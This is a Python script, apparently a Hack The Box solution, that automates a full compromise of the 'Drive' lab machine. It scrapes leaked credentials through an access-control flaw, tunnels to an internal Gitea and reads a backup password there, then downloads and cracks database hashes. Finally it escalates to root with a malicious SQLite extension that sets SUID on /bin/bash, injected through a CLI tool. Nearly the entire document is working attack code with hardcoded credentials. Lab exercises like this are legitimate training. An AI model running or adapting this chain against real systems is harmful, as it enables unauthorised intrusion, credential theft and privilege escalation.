#!/usr/bin/python3
import requests
import paramiko
import re
import getpass
import multiprocessing
import subprocess
import time
import pexpect
import paramiko
import os
from pwn import log


# global variables
register_url = "http://drive.htb/register/"
login_url = "http://drive.htb/login/"
login_gitea = "http://localhost:3000/user/login"
user = 'pr1ngl3ss'
passw = 'pringles!@'
email = 'test@test.com'
s = requests.session()


def GetCsrfTokenRegister():
	r = s.get(register_url)
	return re.findall('name="csrfmiddlewaretoken" value="(.*?)"', r.text)[0]



def register(token, username, email, passw):
	data_post = {
		'csrfmiddlewaretoken': token,
		'username': username,
		'email': email,
		'password1': passw,
		'password2': passw
	}

	r = s.post(register_url, data=data_post)


def GetCsrfToken():
	r = s.get(login_url)
	return re.findall('name="csrfmiddlewaretoken" value="(.*?)"', r.text)[0]

def login(token, username, password):
	post_data = {
		'csrfmiddlewaretoken': token,
		'username': username,
		'password': password
	}

	r = s.post(login_url, data=post_data)

def GetCredentials():
	r = s.get("http://drive.htb/79/block/")

	username = re.findall('user for (.*?) ',r.text)[0]
	password = re.findall('password &quot;(.*?)&quot;',r.text)[0]

	return username, password

def LocalPortForwarding(username, password):
	ssh_command = f"ssh {username}@10.10.11.235 -o StrictHostKeyChecking=no -L:3000:127.0.0.1:3000 -fN"

	ssh_session = pexpect.spawn(ssh_command, timeout=None)

	ssh_session.expect('password:')

	ssh_session.sendline(password)

	ssh_session.interact()


def GetCsrf2Token():
	r = requests.get("http://localhost:3000/user/login")
	return re.findall('name="_csrf" value="(.*?)"',r.text)[0]

def login2(csrf, username, password):
	data_post = {
		'_csrf': csrf,
		'user_name': username,
		'password': password
	}

	r = s.post(login_gitea,data=data_post)

def GetPasswordZip():
	r = s.get("http://localhost:3000/crisDisel/DoodleGrive/raw/branch/main/db_backup.sh")

	return re.findall("7z a -p'(.*?)'",r.text)[0]

def DownloadZip(username, passZip):
	client = paramiko.SSHClient()

	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	client.connect('10.10.11.235', username=username, password=password)

	stdin, stdout, stderr = client.exec_command('python3 -m http.server 8080 --directory /var/www/backups')

	time.sleep(2)

	subprocess.Popen(["wget", "http://10.10.11.235:8080/1_Nov_db_backup.sqlite3.7z"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

	time.sleep(1)

	subprocess.Popen(["7z","x","1_*",f"-p{passZip}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

	time.sleep(1)

def CrackPass():
	os.system("sqlite3 db.sqlite3 --line 'select * from accounts_customuser' | grep 'password' | awk 'NF{print $NF}' > hashes")

	os.system("hashcat --quiet -a 0 -m 124 hashes /usr/share/wordlists/rockyou.txt -o hash")

	with open('hash', 'r') as file:

		password_2 = file.read()

	return	re.findall(":(.*)",password_2)[0]

def Doodle(username,password_2):
	ssh_command = f"ssh {username}@10.10.11.235"

	ssh_session = pexpect.spawn(ssh_command, timeout=None)

	ssh_session.expect('password:')

	ssh_session.sendline(password_2)

	ssh_session.sendline('export TERM=xterm')

	ssh_session.sendline('echo -e "#include <stdlib.h>\\n void sqlite3_extension_init() {\\n\\tsetuid(0);\\n\\tsetgid(0);\\n\\tsystem(\\"/usr/bin/chmod u+s /bin/bash\\");\\n}" > test.c')

	ssh_session.sendline(' gcc test.c -shared -fPIC -o a')

	ssh_session.sendline('./doodleGrive-cli')

	ssh_session.sendline('moriarty')

	ssh_session.sendline('findMeIfY0uC@nMr.Holmz!')

	ssh_session.sendline('5')

	ssh_session.sendline('"+load_extension(char(46,47,97))+"')

	time.sleep(1)

	ssh_session.sendline('6')

	time.sleep(1)

	ssh_session.sendline('bash -p')

	ssh_session.sendline('clear')

	ssh_session.interact()



if __name__ == "__main__":

	csrfmiddlewaretoken = GetCsrfTokenRegister()

	register(csrfmiddlewaretoken, user, email, passw)

	csrfmiddlewaretoken = GetCsrfToken()

	login(csrfmiddlewaretoken, 'pr1ngl3ss', 'pringles!@')

	username, password = GetCredentials()

	proc = multiprocessing.Process(target=LocalPortForwarding, args=(username,password,)).start()

	log.info("Consiguiendo contraseña del ZIP...")

	time.sleep(1)

	csrf = GetCsrf2Token()

	login2(csrf, 'martinCruz', password)

	passZip = GetPasswordZip()

	subprocess.Popen(["killall","/usr/bin/ssh"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

	DownloadZip(username, passZip)

	log.info("Realizando crackeo del hash...")

	password_2 = CrackPass()

	os.system("rm 1_* db* hash*")

	log.info("Accediendo a la máquina...")

	Doodle('tom', password_2)

